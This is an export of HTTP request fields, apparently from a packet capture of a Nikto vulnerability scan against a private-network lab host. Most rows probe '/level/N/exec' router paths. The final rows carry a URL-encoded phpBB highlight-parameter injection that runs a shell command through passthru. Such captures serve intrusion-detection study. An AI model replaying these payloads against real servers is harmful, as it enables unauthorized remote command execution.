http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
																	Keep-Alive										192.168.1.101									4106						1	http://192.168.1.101/web/level/44/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001291)				/web/level/44/exec//show
																	Keep-Alive										192.168.1.101									4107						1	http://192.168.1.101/web/level/45/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001292)				/web/level/45/exec//show
																	Keep-Alive										192.168.1.101									4108						1	http://192.168.1.101/web/level/46/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001293)				/web/level/46/exec//show
																	Keep-Alive										192.168.1.101									4109						1	http://192.168.1.101/web/level/47/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001294)				/web/level/47/exec//show
																	Keep-Alive										192.168.1.101									4110						1	http://192.168.1.101/web/level/48/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001295)				/web/level/48/exec//show
																	Keep-Alive										192.168.1.101									4111						1	http://192.168.1.101/web/level/49/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001296)				/web/level/49/exec//show
																	Keep-Alive										192.168.1.101									4112						1	http://192.168.1.101/web/level/50/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001297)				/web/level/50/exec//show
																	Keep-Alive										192.168.1.101									4113						1	http://192.168.1.101/web/level/51/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001298)				/web/level/51/exec//show
																	Keep-Alive										192.168.1.101									4114						1	http://192.168.1.101/web/level/52/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001299)				/web/level/52/exec//show
																	Keep-Alive										192.168.1.101									4115						1	http://192.168.1.101/web/level/53/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001300)				/web/level/53/exec//show
																	Keep-Alive										192.168.1.101									4116						1	http://192.168.1.101/web/level/54/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001301)				/web/level/54/exec//show
																	Keep-Alive										192.168.1.101									4117						1	http://192.168.1.101/web/level/55/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001302)				/web/level/55/exec//show
																	Keep-Alive										192.168.1.101									4118						1	http://192.168.1.101/web/level/56/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001303)				/web/level/56/exec//show
																	Keep-Alive										192.168.1.101									4119						1	http://192.168.1.101/web/level/57/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001304)				/web/level/57/exec//show
																	Keep-Alive										192.168.1.101									4120						1	http://192.168.1.101/web/level/58/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001305)				/web/level/58/exec//show
																	Keep-Alive										192.168.1.101									4121						1	http://192.168.1.101/web/level/59/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001306)				/web/level/59/exec//show
																	Keep-Alive										192.168.1.101									4122						1	http://192.168.1.101/web/level/60/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001307)				/web/level/60/exec//show
																	Keep-Alive										192.168.1.101									4123						1	http://192.168.1.101/web/level/61/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001308)				/web/level/61/exec//show
																	Keep-Alive										192.168.1.101									4124						1	http://192.168.1.101/web/level/62/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001309)				/web/level/62/exec//show
																	Keep-Alive										192.168.1.101									4125						1	http://192.168.1.101/web/level/63/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001310)				/web/level/63/exec//show
																	Keep-Alive										192.168.1.101									4126						1	http://192.168.1.101/web/level/64/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001311)				/web/level/64/exec//show
																	Keep-Alive										192.168.1.101									4127						1	http://192.168.1.101/web/level/65/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001312)				/web/level/65/exec//show
																	Keep-Alive										192.168.1.101									4128						1	http://192.168.1.101/web/level/66/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001313)				/web/level/66/exec//show
																	Keep-Alive										192.168.1.101									4129						1	http://192.168.1.101/web/level/67/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001314)				/web/level/67/exec//show
																	Keep-Alive										192.168.1.101									4130						1	http://192.168.1.101/web/level/68/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001315)				/web/level/68/exec//show
																	Keep-Alive										192.168.1.101									4131						1	http://192.168.1.101/web/level/69/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001316)				/web/level/69/exec//show
																	Keep-Alive										192.168.1.101									4132						1	http://192.168.1.101/web/level/70/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001317)				/web/level/70/exec//show
																	Keep-Alive										192.168.1.101									4133						1	http://192.168.1.101/web/level/71/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001318)				/web/level/71/exec//show
																	Keep-Alive										192.168.1.101									4134						1	http://192.168.1.101/web/level/72/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001319)				/web/level/72/exec//show
																	Keep-Alive										192.168.1.101									4135						1	http://192.168.1.101/web/level/73/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001320)				/web/level/73/exec//show
																	Keep-Alive										192.168.1.101									4136						1	http://192.168.1.101/web/level/74/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001321)				/web/level/74/exec//show
																	Keep-Alive										192.168.1.101									4137						1	http://192.168.1.101/web/level/75/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001322)				/web/level/75/exec//show
																	Keep-Alive										192.168.1.101									4138						1	http://192.168.1.101/web/level/76/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001323)				/web/level/76/exec//show
																	Keep-Alive										192.168.1.101									4139						1	http://192.168.1.101/web/level/77/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001324)				/web/level/77/exec//show
																	Keep-Alive										192.168.1.101									4140						1	http://192.168.1.101/web/level/78/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001325)				/web/level/78/exec//show
																	Keep-Alive										192.168.1.101									4141						1	http://192.168.1.101/web/level/79/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001326)				/web/level/79/exec//show
																	Keep-Alive										192.168.1.101									4142						1	http://192.168.1.101/web/level/80/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001327)				/web/level/80/exec//show
																	Keep-Alive										192.168.1.101									4143						1	http://192.168.1.101/web/level/81/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001328)				/web/level/81/exec//show
																	Keep-Alive										192.168.1.101									4144						1	http://192.168.1.101/web/level/82/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001329)				/web/level/82/exec//show
																	Keep-Alive										192.168.1.101									4145						1	http://192.168.1.101/web/level/83/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001330)				/web/level/83/exec//show
																	Keep-Alive										192.168.1.101									4146						1	http://192.168.1.101/web/level/84/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001331)				/web/level/84/exec//show
																	Keep-Alive										192.168.1.101									4147						1	http://192.168.1.101/web/level/85/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001332)				/web/level/85/exec//show
																	Keep-Alive										192.168.1.101									4148						1	http://192.168.1.101/web/level/86/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001333)				/web/level/86/exec//show
																	Keep-Alive										192.168.1.101									4149						1	http://192.168.1.101/web/level/87/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001334)				/web/level/87/exec//show
																	Keep-Alive										192.168.1.101									4150						1	http://192.168.1.101/web/level/88/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001335)				/web/level/88/exec//show
																	Keep-Alive										192.168.1.101															1	http://192.168.1.101/web/level/89/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001336)				/web/level/89/exec//show
																	Keep-Alive										192.168.1.101									4155						1	http://192.168.1.101/web/level/90/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001337)				/web/level/90/exec//show
																	Keep-Alive										192.168.1.101									4157						1	http://192.168.1.101/web/level/91/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001338)				/web/level/91/exec//show
																	Keep-Alive										192.168.1.101									4159						1	http://192.168.1.101/web/level/92/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001339)				/web/level/92/exec//show
																	Keep-Alive										192.168.1.101									4161						1	http://192.168.1.101/web/level/93/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001340)				/web/level/93/exec//show
																	Keep-Alive										192.168.1.101									4162						1	http://192.168.1.101/web/level/94/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001341)				/web/level/94/exec//show
																	Keep-Alive										192.168.1.101									4163						1	http://192.168.1.101/web/level/95/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001342)				/web/level/95/exec//show
																	Keep-Alive										192.168.1.101									4164						1	http://192.168.1.101/web/level/96/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001343)				/web/level/96/exec//show
																	Keep-Alive										192.168.1.101									4165						1	http://192.168.1.101/web/level/97/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001344)				/web/level/97/exec//show
																	Keep-Alive										192.168.1.101									4166						1	http://192.168.1.101/web/level/98/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001345)				/web/level/98/exec//show
																	Keep-Alive										192.168.1.101									4167						1	http://192.168.1.101/web/level/99/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001346)				/web/level/99/exec//show
																	Keep-Alive										192.168.1.101									4168						1	http://192.168.1.101/web/index.php?name=Forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001388)				/web/index.php?name=Forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527
																	Keep-Alive										192.168.1.101									4169						1	http://192.168.1.101/web/viewtopic.php?t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001389)				/web/viewtopic.php?t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527
																	Keep-Alive										192.168.1.101									4170						1	http://192.168.1.101/web/index.php?Nikto=Forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001390)				/web/index.php?Nikto=Forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527
																	Keep-Alive										192.168.1.101									4177						1	http://192.168.1.101/web/postnuke/index.php?Nikto=Forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001390)				/web/postnuke/index.php?Nikto=Forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527
																	Keep-Alive										192.168.1.101									4178						1	http://192.168.1.101/web/postnuke/html/index.php?Nikto=Forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001390)				/web/postnuke/html/index.php?Nikto=Forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527
																	Keep-Alive										192.168.1.101									4179						1	http://192.168.1.101/web/modules/index.php?Nikto=Forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001390)				/web/modules/index.php?Nikto=Forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527
																	Keep-Alive										192.168.1.101									4180						1	http://192.168.1.101/web/phpBB/index.php?Nikto=Forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001390)				/web/phpBB/index.php?Nikto=Forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527
